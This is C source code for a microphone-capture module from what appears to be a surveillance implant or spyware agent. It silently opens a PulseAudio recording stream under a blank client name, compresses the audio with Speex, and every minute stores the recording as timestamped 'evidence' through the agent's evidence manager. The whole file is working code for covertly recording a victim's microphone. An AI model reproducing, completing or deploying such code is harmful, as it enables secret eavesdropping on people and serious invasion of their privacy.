#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <pthread.h>
#include <openssl/bio.h>
#include <pulse/simple.h>
#include <speex/speex.h>

#include "me.h"
#include "runtime.h"
#include "module.h"
#include "bioutils.h"
#include "evidencemanager.h"

#define MICMODULE_VERSION 2008121901U
#define FRAMERATE 44100
#define FRAMESECS 60

static void flushbuffer(BIO *bio_data, unsigned int ts);

void *module_mic_main(void *args)
{
   BIO *bio_data = NULL;
   pa_simple *pa = NULL;
   pa_sample_spec paspec = { PA_SAMPLE_S16NE, FRAMERATE, 1 };
   void *state = NULL;
   SpeexBits bits;
   int quality = 3;
   int complexity = 1;
   int framesize = 0;
   int16_t *framein = NULL;
   char *frameout = NULL;
   int len;
   time_t tsnew = 0, tsold = 0;

   debugme("Module MIC started\n");
   if(initlib(INIT_LIBPULSE|INIT_LIBSPEEX)) return NULL;

   do {
      if(!(bio_data = BIO_new(BIO_s_mem()))) break;
      if(!(pa = pa_simple_new(NULL, "", PA_STREAM_RECORD, NULL, "", &paspec, NULL, NULL, NULL))) break;
      speex_bits_init(&bits);
      if(!(state = speex_encoder_init(speex_lib_get_mode(SPEEX_MODEID_UWB)))) break;
      if(speex_encoder_ctl(state, SPEEX_SET_QUALITY, &quality)) break;
      if(speex_encoder_ctl(state, SPEEX_SET_COMPLEXITY, &complexity)) break;
      if(speex_encoder_ctl(state, SPEEX_GET_FRAME_SIZE, &framesize) || !framesize) break;
      if(!(framein = calloc(framesize, sizeof(int16_t)))) break;
      if(!(frameout = calloc(framesize, sizeof(int16_t)))) break;

      tsold = time(NULL);
      while(MODULE_MIC.status != MODULE_STOPPING) {
         if((tsnew = time(NULL)) > (tsold + FRAMESECS)) {
            flushbuffer(bio_data, tsold);
            tsold = tsnew;
         }
         if(pa_simple_read(pa, framein, framesize * sizeof(int16_t), NULL)) break;
         speex_bits_reset(&bits);
         speex_encode_int(state, framein, &bits);
         if(!(len = speex_bits_write(&bits, frameout, framesize * sizeof(int16_t)))) break;
         if(BIO_puti32(bio_data, (unsigned int)len) == -1) break;
         if(BIO_write(bio_data, frameout, len) != len) break;
      }
      flushbuffer(bio_data, tsold);
   } while(0);
   if(framein) free(framein);
   if(frameout) free(frameout);
   if(state) speex_encoder_destroy(state);
   speex_bits_destroy(&bits);
   if(pa) pa_simple_free(pa);
   if(bio_data) BIO_free(bio_data);

   debugme("Module MIC stopped\n");

   return NULL;
}

static void flushbuffer(BIO *bio_data, unsigned int ts)
{
   BIO *bio_additional = NULL;
   char *additionalptr = NULL, *dataptr = NULL;
   long additionallen, datalen;

   do {
      if(!(bio_additional = BIO_new(BIO_s_mem()))) break;
      if(BIO_puti32(bio_additional, MICMODULE_VERSION) == -1) break;
      if(BIO_puti32(bio_additional, FRAMERATE) == -1) break;
      if(BIO_puti32(bio_additional, 0) == -1) break;
      if(BIO_puti32(bio_additional, (uint32_t)ts) == -1) break;
      if(!(additionallen = BIO_get_mem_data(bio_additional, &additionalptr))) break;
      if((datalen = BIO_get_mem_data(bio_data, &dataptr))) evidence_write(EVIDENCE_TYPE_MIC, additionalptr, additionallen, dataptr, datalen);
   } while(0);
   if(bio_additional) BIO_free(bio_additional);
   if(bio_data) BIO_reset(bio_data);

   return;
}
